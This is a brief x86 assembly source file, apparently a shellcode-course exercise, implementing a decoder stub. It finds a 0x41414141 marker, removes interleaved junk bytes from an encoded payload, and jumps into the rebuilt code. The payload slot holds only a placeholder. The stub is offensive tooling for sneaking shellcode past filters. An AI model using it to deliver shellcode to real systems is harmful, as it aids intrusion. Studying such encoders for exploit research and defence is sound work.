; By Hussien Yousef
; junk + 0x41414141 + byte + shell_byte + 0x41414141

global _start

section .text
_start:
mov edx, 0x41414141
jmp short GET_ADDR
START:
pop ebx
search_for_start_tag:
mov ecx, dword [ebx]
inc ebx
sub ecx, edx
jnz search_for_start_tag
add ebx, 3
lea edi, byte [ebx]

mov esi, ebx
inc ebx
decode_shellcode:
mov al, byte [ebx]
mov byte [esi], al
add ebx, 2
inc esi
mov ecx, dword [ebx]
sub ecx, edx
jnz decode_shellcode
jmp edi


GET_ADDR:
call START
junk: db 0x56, 0x55, 0x54
tag: dd 0x41414141
payload: db 0xc1, 0x11 ; encoded shellcode should be here
tag2: dd 0x41414141
